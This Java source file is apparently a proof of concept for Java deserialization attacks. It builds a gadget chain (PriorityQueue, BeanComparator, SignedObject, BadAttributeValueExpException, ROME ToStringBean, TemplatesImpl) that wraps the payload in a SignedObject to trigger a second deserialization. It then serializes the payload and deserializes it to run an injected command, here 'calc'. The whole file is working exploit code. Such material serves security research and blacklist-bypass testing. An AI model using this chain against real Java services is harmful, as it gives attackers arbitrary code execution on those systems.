package gadget.doubleunser;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.ToStringBean;
import javassist.CannotCompileException;
import javassist.NotFoundException;
import org.apache.commons.beanutils.BeanComparator;
import util.GadgetUtils;
import util.ReflectionUtils;
import util.SerializerUtils;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.security.*;
import java.util.PriorityQueue;

/*
* PriorityQueue#readObject
* BeanComparator#compare
* PropertyUtils#getProperty
* SignedObject#getObject
* 二次反序列化
** BadAttributeValueExpException#readObject
* ToStringBean#toString
* TemplatesImpl-->getOutputProperties()
	TemplatesImpl-->newTransformer()
        TemplatesImpl-->getTransletInstance()
            TemplatesImpl-->defineTransletClasses()
                TemplatesImpl-->defineClass()
*
* */
public class cbtoSignedObject1 {
    public static void main(String[] args) throws NoSuchAlgorithmException, NotFoundException, CannotCompileException, IOException, NoSuchFieldException, InstantiationException, IllegalAccessException, ClassNotFoundException, SignatureException, InvalidKeyException {

        TemplatesImpl templates = GadgetUtils.createTemplatesImpl("calc");
        ToStringBean toStringBean2 = new ToStringBean(Templates.class,templates);

        BadAttributeValueExpException badAttributeValueExpException2 = new BadAttributeValueExpException(null);
        ReflectionUtils.setFieldValue(badAttributeValueExpException2,"val",toStringBean2);

        //二次反序列化
        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();
        SignedObject signedObject = new SignedObject(badAttributeValueExpException2, kp.getPrivate(), Signature.getInstance("DSA"));

        //触发SignedObject#getObject

        final BeanComparator comparator = new BeanComparator();
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add(1);
        queue.add(1);

        ReflectionUtils.setFieldValue(comparator, "property", "object");

        ReflectionUtils.setFieldValue(queue, "queue", new Object[]{signedObject, signedObject});

        byte[] payload = SerializerUtils.serialize(queue);

//        SerializerUtils.unserialize(payload);
        ObjectInputStream ois = new MyInputStream(new ByteArrayInputStream(payload));
        ois.readObject();
    }
}
